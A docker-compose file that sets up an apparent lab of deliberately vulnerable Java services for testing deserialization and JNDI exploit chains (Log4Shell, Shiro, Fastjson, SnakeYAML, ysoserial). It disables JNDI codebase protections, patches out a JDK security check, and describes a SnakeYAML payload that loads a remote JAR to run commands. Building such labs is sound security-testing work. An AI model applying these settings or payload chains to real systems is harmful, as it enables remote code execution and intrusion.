version: "3.9"

# ── Vulnerable Java target lab (CT2) ────────────────────────────────────────────
# CT1 = OOBserver (docker-compose.yml), CT2 = these targets
# OOBserver is reachable from all containers via host.docker.internal (192.168.65.254):
#   HTTP/API : 8010   LDAP : 1389   RMI  : 1099   TCP : 9999
#
# Usage (local, OOBserver already on host):
#   docker compose -f docker-compose.target.yml up -d

networks:
  vulnlab:
    driver: bridge

services:

  # ── Custom vulnlab (self-built, all-in-one deser/hessian/fastjson/xstream/log4shell) ──
  vulnlab:
    build:
      context: ./vulnlab-app
      dockerfile: Dockerfile
    container_name: vuln-vulnlab
    restart: unless-stopped
    ports:
      - "8888:8888"
    networks:
      - vulnlab
    extra_hosts:
      - "host.docker.internal:host-gateway"
    labels:
      vuln: "All-in-one: deser/hessian1/hessian2/fastjson/xstream/log4shell"
      endpoints: "/deser /hessian /hessian2 /fastjson /xstream /log4shell"

  # ── Log4Shell (CVE-2021-44228) — Tomcat + Spring Boot + Log4j2 2.14.1 ────
  log4shell:
    image: ghcr.io/christophetd/log4shell-vulnerable-app:latest
    container_name: vuln-log4shell
    restart: unless-stopped
    ports:
      - "8081:8080"
    networks:
      - vulnlab
    extra_hosts:
      - "host.docker.internal:host-gateway"
    environment:
      # Enable remote class loading via LDAP codebase (required for memshell injection)
      JAVA_TOOL_OPTIONS: >-
        -Dcom.sun.jndi.ldap.object.trustURLCodebase=true
        -Dcom.sun.jndi.rmi.object.trustURLCodebase=true
    labels:
      vuln: "Log4Shell CVE-2021-44228"
      payload: "log4shell_basic"

  # ── Apache Shiro RememberMe RCE (self-written target, CC3.2.1+CB1.9.4) ────
  # CVE-2016-4437 (AES-CBC) → POST /login    — port 8082
  # CVE-2020-11989 (AES-GCM) → POST /login-gcm — same container, same port
  shiro:
    build:
      context: ./shiro-app
      dockerfile: Dockerfile
    container_name: vuln-shiro
    restart: unless-stopped
    ports:
      - "8082:8080"
    networks:
      - vulnlab
    extra_hosts:
      - "host.docker.internal:host-gateway"
    environment:
      PORT: "8080"
      SHIRO_KEY: "kPH+bIxk5D2deZiIxcaaaA=="
    labels:
      vuln: "Shiro RememberMe RCE — CBC /login, GCM /login-gcm"
      payload: "shiro_cbc shiro_gcm jchains_shiro_cbc"

  # ── Fastjson 1.2.47 RCE (CVE-2019-14439 / JNDI) ─────────────────────────
  fastjson:
    image: vulfocus/fastjson-rce-2019-2ystemd:latest
    container_name: vuln-fastjson
    restart: unless-stopped
    ports:
      - "8084:8080"
    networks:
      - vulnlab
    labels:
      vuln: "Fastjson ≤1.2.47 JNDI RCE"
      payload: "fastjson_jdbcrowset"

  # ── XStream 1.4.17 CVE-2021-39144 ────────────────────────────────────────
  xstream:
    image: vulfocus/xstream-cve-2021-39144:latest
    container_name: vuln-xstream
    restart: unless-stopped
    ports:
      - "8085:8080"
    networks:
      - vulnlab
    labels:
      vuln: "XStream CVE-2021-39144"
      payload: "xstream_exec"

  # ── Spring4Shell CVE-2022-22965 ───────────────────────────────────────────
  spring4shell:
    image: ghcr.io/cyberxsecurity/spring4shell-vulnerable-app:latest
    container_name: vuln-spring4shell
    restart: unless-stopped
    ports:
      - "8086:8080"
    networks:
      - vulnlab
    labels:
      vuln: "Spring4Shell CVE-2022-22965"
      payload: "ms_spring_interceptor_cmd"

  # ── SnakeYAML deserialization (CVE-2022-1471) ─────────────────────────────
  snakeyaml:
    image: vulfocus/snakeyaml-rce-2022-1471:latest
    container_name: vuln-snakeyaml
    restart: unless-stopped
    ports:
      - "8087:8080"
    networks:
      - vulnlab
    labels:
      vuln: "SnakeYAML CVE-2022-1471"
      payload: "snakeyaml_spi"

  # ── Apache Dubbo Hessian2 (CVE-2021-25641) ───────────────────────────────
  dubbo:
    image: registry.cn-hangzhou.aliyuncs.com/vulhub/dubbo:2.7.3
    container_name: vuln-dubbo
    restart: unless-stopped
    ports:
      - "20880:20880"
      - "8088:8080"
    networks:
      - vulnlab
    labels:
      vuln: "Dubbo Hessian2 CVE-2021-25641"
      payload: "hessian2_spring"

  # ── C3P0 secondary deserialization (0.9.5.2) ─────────────────────────────
  c3p0:
    image: vulfocus/c3p0-secondary-deserialization:latest
    container_name: vuln-c3p0
    restart: unless-stopped
    ports:
      - "8089:8080"
    networks:
      - vulnlab
    labels:
      vuln: "C3P0 secondary deserialization"
      payload: "c3p0_jndi"

  # ── Commons Collections 3.2.1 (general Java deser endpoint) ─────────────
  java-deser:
    image: vulfocus/java-deserialize:latest
    container_name: vuln-java-deser
    restart: unless-stopped
    ports:
      - "8090:8080"
    networks:
      - vulnlab
    labels:
      vuln: "Java native deserialization (CC6)"
      payload: "ysoserial_cc6"

  # ── Java 8u102 target (pre-JEP290 + AIH bootstrap-patched for cc1/cc3) ──────
  # Covers: ysoserial_cc1, ysoserial_cc3, ysoserial_cc2, ysoserial_cc4, ysoserial_jrmp_client
  # Runtime: azul/zulu-openjdk:8u102 with -Xbootclasspath/p:aih-patch.jar to bypass the
  # 8u71 AnnotationInvocationHandler.readObject() security check for CC1/CC3.
  java8-old:
    build:
      context: ./deser-targets
      dockerfile: Dockerfile.java8old
    container_name: vuln-java8old
    restart: unless-stopped
    ports:
      - "8891:8888"
    networks:
      - vulnlab
    extra_hosts:
      - "host.docker.internal:host-gateway"
    labels:
      vuln: "Java 8u102 deser — pre-JEP290 + AIH-patched for CC1/CC3"
      payload: "ysoserial_cc1 ysoserial_cc3 ysoserial_cc2 ysoserial_cc4 ysoserial_jrmp_client"

  # ── Java 7 target (jdk7u21 gadget chain) ─────────────────────────────────
  java7:
    build:
      context: ./deser-targets
      dockerfile: Dockerfile.java7
    container_name: vuln-java7
    restart: unless-stopped
    ports:
      - "8892:8888"
    networks:
      - vulnlab
    extra_hosts:
      - "host.docker.internal:host-gateway"
    labels:
      vuln: "Java 7 deser — jdk7u21 gadget chain"
      payload: "ysoserial_jdk7u21"

  # ── Java 17 target (high-version JDK gadget chains) ──────────────────────
  java17:
    build:
      context: ./deser-targets
      dockerfile: Dockerfile.jdk17
    container_name: vuln-java17
    restart: unless-stopped
    ports:
      - "8893:8888"
    networks:
      - vulnlab
    extra_hosts:
      - "host.docker.internal:host-gateway"
    environment:
      # JAVA_TOOL_OPTIONS splits on whitespace so --add-opens MUST use = not space
      JAVA_TOOL_OPTIONS: >-
        --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED
        --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED
        --add-opens=java.xml/com.sun.org.apache.xml.internal.dtm=ALL-UNNAMED
        --add-opens=java.xml/com.sun.org.apache.xml.internal.utils=ALL-UNNAMED
        --add-opens=java.base/java.lang.reflect=ALL-UNNAMED
        --add-opens=java.base/java.lang=ALL-UNNAMED
    labels:
      vuln: "Java 17 deser — jdk17 high-version gadget chains"
      payload: "jchains_native_jdk17_1 jchains_native_jdk17_2"

  # ── Spring 3.x target (Hessian SpringExec chains + reference for Spring1/2) ──────────
  # Note: ysoserial_spring1/spring2 require JDK < 7u51 (CVE-2014-0428 fix strips AIH map)
  # and are KNOWN_SKIP in verify_chains.py. This target serves jchains Hessian spring_exec.
  spring3:
    build:
      context: ./deser-targets
      dockerfile: Dockerfile.spring3
    container_name: vuln-spring3
    restart: unless-stopped
    ports:
      - "8894:8888"
    networks:
      - vulnlab
    extra_hosts:
      - "host.docker.internal:host-gateway"
    labels:
      vuln: "Spring 4.1.3 deser (JDK 8u202) — Hessian spring_exec chains"
      payload: "jchains_hessian1_spring_exec jchains_hessian2_spring_exec"
      note: "ysoserial_spring1/2 SKIP — require JDK<7u51 (CVE-2014-0428)"

  # ── BeanUtils 1.8.x target (CB2 gadget chain) ────────────────────────────
  cb2:
    build:
      context: ./deser-targets
      dockerfile: Dockerfile.cb2
    container_name: vuln-cb2
    restart: unless-stopped
    ports:
      - "8895:8888"
    networks:
      - vulnlab
    extra_hosts:
      - "host.docker.internal:host-gateway"
    labels:
      vuln: "BeanUtils 1.8.3 deser — CB2 gadget chain"
      payload: "jchains_native_cb2"

  # ── BlazeDS 4.7.3 AMF3 deserialization (jchains_blazeds_axis2) ───────────
  # CVE: Adobe BlazeDS AMF3 arbitrary deserialization
  # Chain: Axis2MetaDataEntry → CB1 → TemplatesImpl → bytecode exec
  # Protocol: HTTP POST /messagebroker/amf  (Content-Type: application/x-amf)
  # java-chains payload name: BlazeDSAMF3AMPayload
  blazeds:
    build:
      context: ./deser-targets
      dockerfile: Dockerfile.blazeds
    container_name: vuln-blazeds
    restart: unless-stopped
    ports:
      - "8896:8080"
    networks:
      - vulnlab
    extra_hosts:
      - "host.docker.internal:host-gateway"
    environment:
      PORT: "8080"
    labels:
      vuln: "BlazeDS AMF3 RCE"
      payload: "jchains_blazeds_axis2"
      endpoint: "POST /messagebroker/amf"
      gadgets: "CC3.2.1 + CC4.0 + CB1.9.4 + BlazeDS4.7.3"

  # ── SnakeYAML SPI JAR HTTP server (jchains_jndi_snakeyaml) ───────────────
  # Serves dynamically-generated JARs for SnakeYAML SPI gadget chain.
  # The chain: !!ScriptEngineManager [!!URLClassLoader [[!!URL ["http://THIS:8099/rce.jar?cmd=CMD"]]]]
  # When SnakeYAML parses the YAML, URLClassLoader fetches the JAR from this server,
  # ScriptEngineManager SPI instantiates RceFactory, constructor executes the cmd.
  #
  # Endpoint: GET /rce.jar?cmd=<url-encoded-command>
  # Used by: jchains_jndi_snakeyaml (OOBserver's LDAP server returns SnakeyamlRef
  #          pointing to this server as the JAR download URL)
  spi-jar-server:
    build:
      context: ./deser-targets/spi-jar-server
      dockerfile: Dockerfile
    container_name: vuln-spi-jar-server
    restart: unless-stopped
    ports:
      - "8099:8099"
    networks:
      - vulnlab
    extra_hosts:
      - "host.docker.internal:host-gateway"
    environment:
      PORT: "8099"
    labels:
      vuln: "SnakeYAML SPI JAR server"
      payload: "jchains_jndi_snakeyaml"
      endpoint: "GET /rce.jar?cmd=<url-encoded-command>"
